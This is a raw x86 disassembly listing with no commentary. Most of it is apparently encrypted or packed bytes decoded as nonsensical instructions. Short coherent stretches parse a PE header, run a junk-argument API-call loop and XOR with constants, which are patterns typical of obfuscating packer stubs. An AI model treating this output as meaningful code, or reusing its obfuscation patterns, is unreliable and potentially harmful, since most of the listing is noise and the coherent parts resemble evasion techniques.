  409c46:	add    cl,0xd6
  409c49:	mov    cl,0xd2
  409c4b:	jmp    0x8b4d:0x26c955ce
  409c52:	shl    DWORD PTR [esi-0x1b7f0600],0x98
  409c59:	xchg   edx,eax
  409c5a:	es or  al,0x30
  409c5d:	and    eax,0xd57a8280
  409c62:	dec    esi
  409c63:	jmp    0x46bf6b10
  409c68:	test   DWORD PTR ss:[eax+0x5566f8e5],eax
  409c6f:	mov    eax,0x65be51a6
  409c74:	retf   
  409c75:	add    BYTE PTR [ebx+0x17],0x1e
  409c79:	mov    cl,0x92
  409c7b:	sbb    cl,BYTE PTR [ebp+edi*1+0x7d]
  409c7f:	test   BYTE PTR [edi+0x2],ch
  409c82:	mov    ch,0x3e
  409c84:	mov    bh,0x20
  409c86:	dec    edi
  409c87:	daa    
  409c88:	in     al,dx
  409c89:	add    cl,BYTE PTR [ecx-0x15a893ba]
  409c8f:	stc    
  409c90:	jnp    0x409c6a
  409c92:	and    BYTE PTR [esi],al
  409c94:	adc    al,0xc0
  409c96:	popa   
  409c97:	gs ss std 
  409c9a:	inc    eax
  409c9b:	pop    ds
  409c9c:	dec    edi
  409c9d:	xchg   ebx,eax
  409c9e:	(bad)  
  409c9f:	mov    dh,0x3
  409ca1:	pop    esi
  409ca2:	jne    0x409c3a
  409ca4:	mov    al,BYTE PTR [eax]
  409ca6:	adc    DWORD PTR ds:0x424861,0x44a6e0
  409cb0:	add    al,0x35
  409cb2:	xor    al,0x49
  409cb4:	jmp    0x409e1f
  409cb9:	add    DWORD PTR [edx+0x60],esp
  409cbc:	in     eax,dx
  409cbd:	arpl   bp,bp
  409cbf:	cdq    
  409cc0:	jp     0x409c53
  409cc2:	fldenv [esi+ebx*2-0x7aaad9fb]
  409cc9:	mov    cl,0xc0
  409ccb:	jl     0x409d49
  409ccd:	retf   0x7c7f
  409cd0:	jl     0x409d3a
  409cd2:	out    dx,al
  409cd3:	inc    BYTE PTR [esi*8-0x6318d133]
  409cda:	lock mov al,ds:0xe0384031
  409ce0:	mov    dh,0xc1
  409ce2:	cli    
  409ce3:	sub    esi,DWORD PTR [esi+0x6b6d0482]
  409ce9:	mov    al,ds:0x738dcad5
  409cee:	mov    ah,0x8f
  409cf0:	outs   dx,DWORD PTR ds:[esi]
  409cf1:	mov    DWORD PTR [ebp-0x36],eax
  409cf4:	iret   
  409cf5:	sbb    al,0x1b
  409cf7:	int3   
  409cf8:	jnp    0x409cf9
  409cfa:	pop    esp
  409cfb:	(bad)  
  409cfc:	mov    ebx,0x1d1bcef7
  409d01:	add    al,0x91
  409d03:	add    bl,BYTE PTR [ebp-0x43]
  409d06:	test   DWORD PTR [esi+0x2097602a],edx
  409d0c:	call   0x86ab:0x2639cb8b
  409d13:	jns    0x409cfa
  409d15:	push   cs
  409d16:	mov    dh,0xae
  409d18:	inc    ecx
  409d19:	call   0xa1a32dad
  409d1e:	sbb    dl,ah
  409d20:	sub    al,0x2d
  409d22:	leave  
  409d23:	push   esi
  409d24:	mov    ebx,0x2f3c2c79
  409d29:	xor    ecx,DWORD PTR ss:[esi+0xe]
  409d2d:	cdq    
  409d2e:	scas   eax,DWORD PTR es:[edi]
  409d2f:	into   
  409d30:	sbb    al,0x1d
  409d32:	fidiv  WORD PTR ds:0xd8d50384
  409d38:	mov    cl,0x3e
  409d3a:	fnsave [edx]
  409d3c:	into   
  409d3d:	je     0x409d7c
  409d3f:	adc    dh,BYTE PTR [eax-0x6c]
  409d42:	ret    
  409d43:	cmc    
  409d44:	push   ss
  409d45:	push   edi
  409d46:	push   cs
  409d47:	(bad)  
  409d48:	mov    ecx,0xdac4926c
  409d4d:	ret    0xe4ac
  409d50:	xlat   BYTE PTR ds:[ebx]
  409d51:	inc    ebx
  409d52:	dec    ebx
  409d53:	int3   
  409d54:	jno    0x409ceb
  409d56:	pusha  
  409d57:	pop    ebx
  409d58:	sbb    al,0xeb
  409d5a:	enter  0xef7d,0x71
  409d5e:	jg     0x409d73
  409d60:	mov    ah,0x4c
  409d62:	les    ecx,FWORD PTR [edi+0x78566352]
  409d68:	jmp    0x4de3496a
  409d6d:	jle    0x409d80
  409d6f:	cmp    ebx,DWORD PTR [ebp-0x67]
  409d72:	sub    al,0x9b
  409d74:	enter  0xbf20,0x1a
  409d78:	loopne 0x409ddd
  409d7a:	pmulhuw mm4,QWORD PTR [edx]
  409d7d:	pop    esp
  409d7e:	stc    
  409d7f:	xchg   edx,eax
  409d80:	fidivr DWORD PTR [eax]
  409d82:	and    al,0x6e
  409d84:	sbb    esi,DWORD PTR [edx-0x5541d962]
  409d8a:	out    dx,eax
  409d8b:	lock fistp WORD PTR [ebx]
  409d8e:	outs   dx,DWORD PTR ds:[esi]
  409d8f:	idiv   BYTE PTR [ecx-0x1a06c511]
  409d95:	loop   0x409d73
  409d97:	xchg   BYTE PTR [edi-0x24156c1e],ch
  409d9d:	or     al,0x73
  409d9f:	jmp    0x70c1251d
  409da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409da5:	xchg   esp,eax
  409da6:	inc    esi
  409da7:	sub    BYTE PTR [esi+0xefc7585],ah
  409dad:	mov    eax,DWORD PTR [edi+0x9000daa]
  409db3:	inc    ebp
  409db4:	(bad)  [edx-0x3b]
  409db7:	retf   
  409db8:	into   
  409db9:	les    edi,FWORD PTR [edx]
  409dbb:	and    eax,0x399b95d6
  409dc0:	mov    eax,0x2236328a
  409dc5:	cmc    
  409dc6:	es out 0x52,al
  409dc9:	mov    ds:0x282a77a0,al
  409dce:	pop    esi
  409dcf:	js     0x409d70
  409dd1:	jp     0x409e45
  409dd3:	aas    
  409dd4:	cmc    
  409dd5:	inc    eax
  409dd6:	mov    esi,ebx
  409dd8:	out    dx,al
  409dd9:	or     dl,BYTE PTR [esp+edx*8]
  409ddc:	lahf   
  409ddd:	jno    0x409dbb
  409ddf:	cmp    dh,al
  409de1:	stc    
  409de2:	cld    
  409de3:	sub    DWORD PTR [ecx-0x7b467e19],edx
  409de9:	mov    ebx,esi
  409deb:	rcr    DWORD PTR [ebp+0x3d],0xe6
  409def:	dec    ebp
  409df0:	jne    0x409d8f
  409df2:	(bad)  
  409df4:	mov    eax,0xdd9ab983
  409df9:	fs icebp 
  409dfb:	pop    eax
  409dfc:	xchg   ecx,eax
  409dfd:	cs daa 
  409dff:	cwde   
  409e00:	icebp  
  409e01:	mov    ?,WORD PTR [edx+0x5ef96d64]
  409e07:	test   eax,0x88aa1e40
  409e0c:	les    ebp,FWORD PTR [ecx+eiz*4]
  409e0f:	jmp    0x52e1:0x679ff6e6
  409e16:	sbb    eax,DWORD PTR [ecx]
  409e18:	xor    DWORD PTR [ecx-0x1a],0xbb9ddd6e
  409e1f:	cmp    al,0xcb
  409e21:	mov    DWORD PTR ds:0x424849,0x71b7
  409e2b:	jne    0x40a324
  409e31:	or     DWORD PTR ds:0x410757,edx
  409e37:	mov    eax,DWORD PTR [ebp+0x8]
  409e3a:	mov    ecx,DWORD PTR [ebp+0x8]
  409e3d:	adc    DWORD PTR ds:0x447988,0x48d6
  409e47:	add    ecx,DWORD PTR [eax+0x3c]
  409e4a:	mov    edx,DWORD PTR ds:0x4444dc
  409e50:	xor    eax,eax
  409e52:	or     eax,DWORD PTR ds:0x4444e8
  409e58:	sub    eax,edx
  409e5a:	and    edx,DWORD PTR [edx+eax*1]
  409e5d:	mov    edx,0x7510857
  409e62:	mov    DWORD PTR ds:0x410743,0x1d
  409e6c:	cmp    DWORD PTR ds:0x410743,0x0
  409e73:	je     0x409eb2
  409e79:	cmp    DWORD PTR ds:0x410743,0x2c
  409e80:	jne    0x409ea2
  409e86:	push   DWORD PTR [ebp-0x1c]
  409e89:	push   DWORD PTR [ebp-0x28]
  409e8c:	push   DWORD PTR [ebp-0x10]
  409e8f:	push   0x1f6d
  409e94:	push   0x61b1
  409e99:	push   DWORD PTR [ebp-0x14]
  409e9c:	call   DWORD PTR ds:0x442044
  409ea2:	mov    eax,ds:0x410743
  409ea7:	dec    eax
  409ea8:	mov    ds:0x410743,eax
  409ead:	jmp    0x409e6c
  409eb2:	mov    DWORD PTR [ebp+0x8],ecx
  409eb5:	mov    eax,DWORD PTR [ebp-0x4]
  409eb8:	xor    eax,edx
  409eba:	push   esi
  409ebb:	mov    esi,DWORD PTR [ebp+0x8]
  409ebe:	mov    ecx,0x32729e
  409ec3:	add    eax,ecx
  409ec5:	cmp    DWORD PTR [esi+0x54],eax
  409ec8:	jmp    0x40a033
  409ecd:	mov    esi,0x45a9bf40
  409ed2:	mov    ebp,0xfb297b56
  409ed7:	test   BYTE PTR [esi-0x79832206],bl
  409edd:	cmpps  xmm7,XMMWORD PTR [esp+edi*2-0x36],0x7f
  409ee3:	jl     0x409f61
  409ee5:	add    BYTE PTR [eax],dh
  409ee7:	rol    bh,0x12
  409eea:	ins    DWORD PTR es:[edi],dx
  409eeb:	lods   eax,DWORD PTR ds:[si]
  409eed:	stos   DWORD PTR es:[edi],eax
  409eee:	push   0xfffffff9
  409ef0:	push   edx
  409ef1:	out    0x4,eax
  409ef3:	inc    ebp
  409ef4:	inc    ebx
  409ef5:	xlat   BYTE PTR ds:[ebx]
  409ef6:	jle    0x409f5f
  409ef8:	xchg   dl,dl
  409efa:	xchg   dl,dl
  409efc:	and    ah,BYTE PTR [edx]
  409efe:	outs   dx,DWORD PTR ds:[esi]
  409eff:	stos   BYTE PTR es:[edi],al
  409f00:	pop    edi
  409f01:	ins    DWORD PTR es:[edi],dx
  409f02:	loopne 0x409ee5
  409f04:	cwde   
  409f05:	pop    edx
  409f06:	jl     0x409f4f
  409f08:	jle    0x409ef3
  409f0a:	inc    esi
  409f0b:	jle    0x409f84
  409f0d:	inc    edi
  409f0e:	sbb    BYTE PTR [edi-0x2f],bl
  409f11:	test   BYTE PTR [esi+0x59],0x58
  409f15:	lock loope 0x409f01
  409f18:	ja     0x409eb4
  409f1a:	lods   al,BYTE PTR ds:[esi]
  409f1c:	push   eax
  409f1d:	jle    0x409ee5
  409f1f:	dec    esi
  409f20:	jae    0x409f48
  409f22:	push   ecx
  409f23:	in     al,dx
  409f24:	xchg   WORD PTR [edx+eax*1],si
  409f28:	push   es
  409f29:	sbb    al,0x49
  409f2b:	or     DWORD PTR [ebx],edi
  409f2d:	fs mov ah,0x2b
  409f30:	adc    eax,0x44a459c4
  409f35:	cli    
  409f36:	rcr    BYTE PTR [edi-0x58df3660],cl
  409f3c:	retf   
  409f3d:	out    dx,eax
  409f3e:	mov    esp,0x8a293f78
  409f43:	les    ebp,FWORD PTR [edx+0x47]
  409f46:	jb     0x409f5d
  409f48:	add    BYTE PTR [ebx-0x41a96c15],0x8f
  409f4f:	jp     0x409f7a
  409f51:	stos   BYTE PTR es:[edi],al
  409f52:	shl    BYTE PTR [esi+0x40f50724],0x95
  409f59:	std    
  409f5a:	(bad)  
  409f5b:	sub    ebx,DWORD PTR [edi+ebp*8+0x3493a952]
  409f62:	pusha  
  409f63:	xchg   ebp,eax
  409f64:	bound  ebx,QWORD PTR [ebp+0x2b0bd55a]
  409f6a:	scas   eax,DWORD PTR es:[edi]
  409f6b:	xor    al,0x6
  409f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f6e:	mov    DWORD PTR es:[edx+ebp*1-0x69],edx
  409f73:	or     BYTE PTR [ecx],al
  409f75:	or     ah,dl
  409f77:	jb     0x409f6f
  409f79:	scas   al,BYTE PTR es:[edi]
  409f7a:	fwait
  409f7b:	sbb    ah,BYTE PTR [ecx-0x1e21fe78]
  409f81:	je     0x409f54
  409f83:	jp     0x409f56
  409f85:	jno    0x409fee
  409f87:	and    BYTE PTR [eax-0x48],0x38
  409f8b:	add    DWORD PTR [ecx],edx
  409f8d:	outs   dx,DWORD PTR ds:[esi]
  409f8e:	mov    WORD PTR [esi-0x21d6740d],?
  409f94:	in     al,0x9e
  409f96:	and    ebp,DWORD PTR [edi]
  409f98:	retf   
  409f99:	push   edi
  409f9a:	inc    ebx
  409f9b:	xchg   ebx,eax
  409f9c:	test   al,0x32
  409f9e:	mov    esp,0xbba5e2ec
  409fa3:	xor    eax,0x1159ebb5
  409fa8:	xor    DWORD PTR [ecx+0x6f],ebp
  409fab:	and    DWORD PTR ds:0x44b70ec7,edi
  409fb1:	xor    cl,0x3f
  409fb4:	mov    bh,0xd3
  409fb6:	test   al,0x46
  409fb8:	icebp  
  409fb9:	lahf   
  409fba:	jmp    0x409f74
  409fbc:	loope  0x409fbc
  409fbe:	mov    BYTE PTR [edi-0x2a],dh
  409fc1:	push   cs
  409fc2:	jns    0x409fe3
  409fc4:	retf   
  409fc5:	xchg   edi,eax
  409fc6:	mul    BYTE PTR [esi-0x210dd7a2]
  409fcc:	jmp    0x84ac:0x8656ba5d
  409fd3:	ins    DWORD PTR es:[edi],dx
  409fd4:	je     0x409ff6
  409fd6:	aas    
  409fd7:	ins    BYTE PTR es:[edi],dx
  409fd8:	xchg   DWORD PTR ds:0x17ef437f,esp
  409fde:	cmc    
  409fdf:	mov    BYTE PTR ds:0x5e635672,cl
  409fe5:	rcl    DWORD PTR [ecx-0x6002c4e7],1
  409feb:	test   eax,0x9ed7622d
  409ff0:	push   cs
  409ff1:	cmp    BYTE PTR [esi-0xa],0xfa
  409ff5:	call   0x5e21876
  409ffa:	jle    0x40a079
  409ffc:	out    0xf6,al
  409ffe:	fcomip st,st(1)
  40a000:	mov    WORD PTR [ebp+0x25],?
  40a003:	das    
  40a004:	(bad)  
  40a005:	stos   DWORD PTR es:[edi],eax
  40a006:	mov    dl,0xe9
  40a008:	pop    edx
  40a009:	dec    esp
  40a00a:	xchg   esi,eax
  40a00b:	dec    ecx
  40a00c:	in     eax,0x4
  40a00e:	xor    BYTE PTR [ecx],al
  40a010:	repz jl 0x40a065
  40a013:	add    DWORD PTR [esi+0x18],0xa310c293
  40a01a:	and    al,0x22
  40a01c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01d:	lods   eax,DWORD PTR ds:[esi]
  40a01e:	adc    bx,si
  40a021:	cmp    DWORD PTR [ebx-0xc],esp
  40a024:	ja     0x40a038
  40a026:	inc    edx
  40a027:	adc    eax,0xe99c5a41
  40a02c:	fidivr WORD PTR [ecx+0x12991cbc]
  40a032:	outs   dx,BYTE PTR ds:[esi]
  40a033:	pop    esi
  40a034:	je     0x40a1ad
  40a03a:	mov    eax,DWORD PTR [ebp+0x8]
  40a03d:	jmp    0x40a331
  40a042:	jmp    0x40a1ad
  40a047:	xchg   ecx,eax
  40a048:	test   dh,dl
  40a04a:	loopne 0x40a045
  40a04c:	bound  edi,QWORD PTR [ebp+0x7db7845d]
  40a052:	add    DWORD PTR [eax-0x22cbc648],ebx
  40a058:	lds    edi,FWORD PTR [esp+edi*2-0x36]
  40a05c:	jg     0x40a0da
  40a05e:	jl     0x409fee
  40a060:	test   DWORD PTR ds:0xaf82c4bd,eax
  40a066:	clc    
  40a067:	mov    dl,0x71
  40a069:	hlt    
  40a06a:	xor    ch,ch
  40a06c:	fcomip st,st(4)
  40a06e:	scas   al,BYTE PTR es:[edi]
  40a06f:	lds    esi,FWORD PTR [edx]
  40a071:	add    al,0x71
  40a073:	enter  0xfb7a,0xe7
  40a077:	jne    0x40a0eb
  40a079:	adc    al,0xbe
  40a07b:	lods   al,BYTE PTR ds:[esi]
  40a07c:	not    BYTE PTR [edx-0x7d49bc73]
  40a082:	ret    0xa5b
  40a085:	inc    esi
  40a086:	imul   ebp,ebx,0x3
  40a089:	iret   
  40a08a:	(bad)  
  40a08b:	sbb    dh,BYTE PTR [edx-0x44bae2b]
  40a091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a092:	pop    eax
  40a093:	mov    dh,0x53
  40a095:	ret    
  40a096:	aas    
  40a097:	arpl   WORD PTR [esi],si
  40a099:	xlat   BYTE PTR ds:[ebx]
  40a09a:	jno    0x40a052
  40a09c:	imul   esp,edi,0x3c5fa2f
  40a0a2:	fsubr  DWORD PTR [edi]
  40a0a4:	xor    dh,BYTE PTR [edi-0x549faf69]
  40a0aa:	ror    BYTE PTR [eax+0x10],1
  40a0ad:	(bad)  
  40a0ae:	xchg   edx,eax
  40a0af:	cld    
  40a0b0:	nop
  40a0b1:	inc    edi
  40a0b2:	fimul  WORD PTR [edx+0x28]
  40a0b5:	clc    
  40a0b6:	xchg   ebp,eax
  40a0b7:	int3   
  40a0b8:	xchg   edx,eax
  40a0b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ba:	hlt    
  40a0bb:	(bad)  
  40a0bc:	mov    dh,0xe7
  40a0be:	in     eax,0x17
  40a0c0:	aas    
  40a0c1:	outs   dx,BYTE PTR ds:[esi]
  40a0c2:	test   eax,0xf2851d9c
  40a0c7:	int3   
  40a0c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0c9:	dec    ecx
  40a0ca:	sbb    ax,0x93a0
  40a0ce:	and    ah,bh
  40a0d0:	ror    cl,0x7a
  40a0d3:	sub    ebp,0x3c
  40a0d6:	je     0x40a0a8
  40a0d8:	jp     0x40a0ac
  40a0da:	add    al,0x1b
  40a0dc:	cmp    BYTE PTR [ebx+0x7d9d8631],cl
  40a0e2:	es fs mov ebp,0x85da3f35
  40a0e9:	dec    ebp
  40a0ea:	inc    ebx
  40a0eb:	out    0x8c,eax
  40a0ed:	dec    edx
  40a0ee:	inc    eax
  40a0ef:	loopne 0x40a11d
  40a0f1:	test   DWORD PTR [edi],ebx
  40a0f3:	leave  
  40a0f4:	mov    cl,0xf6
  40a0f6:	mov    esi,0x922fbc78
  40a0fb:	call   FWORD PTR [ebp-0x160870f2]
  40a101:	jno    0x40a163
  40a103:	jmp    0x40a172
  40a105:	xor    al,0xfb
  40a107:	shl    ah,cl
  40a109:	xlat   BYTE PTR ds:[ebx]
  40a10a:	idiv   DWORD PTR [ecx]
  40a10c:	cmp    esi,edx
  40a10e:	push   eax
  40a10f:	repz adc al,0xcb
  40a112:	scas   al,BYTE PTR es:[edi]
  40a113:	mov    eax,ds:0x8bc8b885
  40a118:	mov    DWORD PTR [eax+0x64],edi
  40a11b:	ret    
  40a11c:	imul   edi,DWORD PTR [edi-0x497da78],0xf14f622f
  40a126:	or     ch,dh
  40a128:	jmp    0xdaa6eb3b
  40a12d:	cmp    DWORD PTR [ebp+0x14],0x6d
  40a131:	push   ss
  40a132:	jl     0x40a17f
  40a134:	inc    ebx
  40a135:	push   0xde58d1b
  40a13a:	out    0xdf,al
  40a13c:	setae  BYTE PTR [ebp-0x7eb33f00]
  40a143:	cmp    DWORD PTR [edx-0x5a],ebp
  40a146:	pop    ebp
  40a147:	ret    0x5eca
  40a14a:	sbb    DWORD PTR [edx-0x21ebfb0f],0x7
  40a151:	sbb    eax,0x19a22a6c
  40a156:	dec    esi
  40a157:	inc    ebx
  40a158:	pop    edi
  40a159:	inc    esi
  40a15a:	pop    ecx
  40a15b:	dec    edi
  40a15c:	jmp    FWORD PTR [eax+0x4845c72b]
  40a162:	pop    ds
  40a163:	or     ebp,0x130629d8
  40a169:	lds    edi,FWORD PTR [edi]
  40a16b:	xor    cl,cl
  40a16d:	mov    edx,0x2a4f89d7
  40a172:	addr16 loop 0x40a12a
  40a175:	xchg   edi,eax
  40a176:	sahf   
  40a177:	in     al,0xe
  40a179:	pop    ds
  40a17a:	jg     0x40a1ac
  40a17c:	mov    ?,WORD PTR [edx]
  40a17e:	cld    
  40a17f:	les    eax,FWORD PTR [edi+0x60]
  40a182:	cmp    eax,edi
  40a184:	xor    cl,0xd9
  40a187:	pop    eax
  40a188:	lds    eax,FWORD PTR [edi+0x33]
  40a18b:	test   DWORD PTR [ebx+0xe60e60b],0xb9e7eeaf
  40a195:	lods   al,BYTE PTR ds:[esi]
  40a196:	lds    ecx,FWORD PTR [esi]
  40a198:	pop    es
  40a199:	cmp    dl,BYTE PTR [ebp+0xdcdb18c]
  40a19f:	push   cs
  40a1a0:	pop    ss
  40a1a1:	into   
  40a1a2:	dec    esp
  40a1a3:	fldenv [ebx+ebp*2+0x6e]
  40a1a7:	sbb    eax,0xadd7b327
  40a1ac:	mov    al,0x8b
  40a1ae:	inc    ebp
  40a1af:	cld    
  40a1b0:	jmp    0x40a31b
  40a1b5:	aam    0x68
  40a1b7:	rol    BYTE PTR [eax+0x50],1
  40a1ba:	pop    eax
  40a1bb:	fs js  0x40a15e
  40a1be:	jge    0x40a14e
  40a1c0:	ficom  WORD PTR [esi]
  40a1c2:	aaa    
  40a1c3:	call   0xca7c:0x7cc4aba6
  40a1ca:	jg     0x40a248
  40a1cc:	jl     0x40a238
  40a1ce:	enter  0xc980,0x90
  40a1d2:	pop    eax
  40a1d3:	rcr    BYTE PTR [ebx],cl
  40a1d5:	sbb    al,0xce
  40a1d7:	jge    0x40a1cd
  40a1d9:	inc    edi
  40a1da:	xlat   BYTE PTR ds:[ebx]
  40a1db:	call   0x862:0x2d03bebc
  40a1e2:	ss pushf 
  40a1e4:	mov    al,ds:0x8445dfe
  40a1e9:	and    eax,0xb4229269
  40a1ee:	data16 and al,BYTE PTR [eax+0x2]
  40a1f2:	lods   eax,DWORD PTR ds:[esi]
  40a1f3:	pop    ebx
  40a1f4:	push   es
  40a1f5:	add    ch,BYTE PTR gs:[edx-0x7f71b999]
  40a1fc:	xchg   ebp,eax
  40a1fd:	cs into 
  40a1ff:	xchg   edx,eax
  40a200:	in     al,0x8d
  40a202:	adc    BYTE PTR [edx+0x38364f6e],al
  40a208:	mov    eax,ds:0x8ba25f41
  40a20d:	mov    al,0xba
  40a20f:	sub    BYTE PTR [esi+0x4c],al
  40a212:	mov    eax,ds:0x5774fb90
  40a217:	inc    ecx
  40a218:	xor    bh,BYTE PTR [edi-0x61]
  40a21b:	push   esp
  40a21c:	and    eax,0x3c641fb9
  40a221:	cmp    DWORD PTR [esi],edi
  40a223:	and    al,0xca
  40a225:	out    dx,eax
  40a226:	and    esi,esi
  40a228:	cmpxchg DWORD PTR [ebp+0x40badfa8],eax
  40a22f:	shl    DWORD PTR [edi+ecx*2],0x8
  40a233:	das    
  40a234:	rep ins BYTE PTR es:[edi],dx
  40a236:	add    esp,eax
  40a238:	aas    
  40a239:	dec    ebx
  40a23a:	vmwrite ecx,DWORD PTR [edi-0x29317b3b]
  40a241:	daa    
  40a242:	stos   DWORD PTR es:[edi],eax
  40a243:	push   eax
  40a244:	sbb    eax,0x722f358d
  40a249:	fisttp DWORD PTR [ebp+0x7896100a]
  40a24f:	cmp    BYTE PTR [edi+0xe],dh
  40a252:	fs je  0x40a221
  40a255:	push   cs
  40a256:	xchg   dh,ah
  40a258:	jbe    0x40a278
  40a25a:	push   ss
  40a25b:	popf   
  40a25c:	cmc    
  40a25d:	in     al,dx
  40a25e:	ror    DWORD PTR [edi+edx*1-0x55],0x7c
  40a263:	cmp    edx,DWORD PTR [edx+0x7e]
  40a266:	(bad)  
  40a267:	in     eax,dx
  40a268:	loope  0x40a236
  40a26a:	push   ecx
  40a26b:	sbb    ecx,DWORD PTR [esi+0x6beddc]
  40a271:	dec    eax
  40a272:	ror    cl,0xfc
  40a275:	mov    esi,0x7707b6d6
  40a27a:	jge    0x40a29a
  40a27c:	(bad)  
  40a27d:	sbb    edx,DWORD PTR ds:0x49cf54
  40a283:	retf   0xe719
  40a286:	xchg   esi,eax
  40a287:	repz push edi
  40a289:	jecxz  0x40a24e
  40a28b:	(bad)  
  40a28c:	popf   
  40a28d:	(bad)  
  40a28e:	pop    ecx
  40a28f:	push   edi
  40a290:	dec    ebp
  40a291:	push   ebx
  40a292:	ffree  st(6)
  40a294:	call   0x8338:0x789fb867
  40a29b:	std    
  40a29c:	ret    0x6e58
  40a29f:	ss gs xchg ecx,eax
  40a2a2:	aam    0x3b
  40a2a4:	call   0xec131a8b
  40a2a9:	mov    al,BYTE PTR [ecx+0x252f7cf0]
  40a2af:	sbb    ah,al
  40a2b1:	inc    esp
  40a2b2:	push   ecx
  40a2b3:	push   esp
  40a2b4:	loopne 0x40a31b
  40a2b6:	mov    ds:0x2042d88f,eax
  40a2bb:	shl    DWORD PTR [ebp+0x5c],0x62
  40a2bf:	pop    es
  40a2c0:	jmp    0xaa1a:0x2e1f002d
  40a2c7:	jmp    0xf150:0xd14fd494
  40a2ce:	call   0xe90db892
  40a2d3:	aam    0x37
  40a2d5:	add    bl,BYTE PTR ds:0x564512c2
  40a2db:	jo     0x40a260
  40a2dd:	pushf  
  40a2de:	(bad)  
  40a2df:	adc    cl,BYTE PTR [esi]
  40a2e1:	xlat   BYTE PTR cs:[ebx]
  40a2e3:	iret   
  40a2e4:	jge    0x40a333
  40a2e6:	jp     0x40a338
  40a2e8:	addr16 aaa 
  40a2ea:	push   0xffffffd6
  40a2ec:	mov    eax,0x42bf807c
  40a2f1:	out    dx,al
  40a2f2:	lea    esi,[ecx+0x38435da1]
  40a2f8:	fild   WORD PTR [ecx-0x1d]
  40a2fb:	push   edx
  40a2fc:	inc    esi
  40a2fd:	in     eax,0x4d
  40a2ff:	std    
  40a300:	inc    eax
  40a301:	ret    
  40a302:	in     eax,0xda
  40a304:	push   esp
  40a305:	shr    DWORD PTR [edx+eiz*2+0x2a02ea22],cl
  40a30c:	mov    cl,0x8b
  40a30e:	loopne 0x40a2ce
  40a310:	and    BYTE PTR [edx-0xf],bh
  40a313:	cli    
  40a314:	mov    ecx,0x6f12d081
  40a319:	iret   
  40a31a:	shl    DWORD PTR [ebx],0xc2
  40a31d:	add    eax,ecx
  40a31f:	jmp    0x40a331
  40a324:	mov    eax,DWORD PTR [ebp-0x4]
  40a327:	xor    eax,0x7510857
  40a32c:	add    eax,0x32729e
  40a331:	leave  
  40a332:	ret    0x4
  40a335:	dec    ebp
  40a336:	push   ebp
  40a337:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40a33d:	mov    esp,ebp
  40a33f:	or     ah,dh
  40a341:	dec    ebp
  40a342:	add    bh,al
  40a344:	add    BYTE PTR [eax],cl
  40a346:	add    BYTE PTR [eax],al
  40a348:	mov    DWORD PTR [eax],0x40f44545
  40a34e:	xor    eax,0x9c8b8500
  40a353:	hlt    
  40a354:	clc    
  40a355:	retf   
  40a356:	(bad)  
  40a357:	enter  0x4d45,0xbc
  40a35b:	mov    esi,DWORD PTR [esp+esi*8]
  40a35e:	test   ebx,ecx
  40a360:	pushf  
  40a361:	enter  0x4df8,0x8b
  40a365:	mov    DWORD PTR [ebp-0x20],0x890208
  40a36c:	inc    ebp
  40a36d:	inc    ebp
  40a36e:	cld    
  40a36f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40a375:	or     BYTE PTR [ebx+0x0],dl
  40a378:	mov    ebx,0x8bd5700
  40a37d:	call   DWORD PTR [ecx-0x1]
  40a380:	pop    es
  40a381:	mov    ch,0x33
  40a383:	dec    ebx
  40a385:	(bad)  
  40a386:	mov    eax,0x72009ea4
  40a38b:	push   DWORD PTR [edx]
  40a38d:	or     BYTE PTR [eax],al
  40a38f:	jmp    0xff89:0x75c84d03
  40a396:	dec    ebp
  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
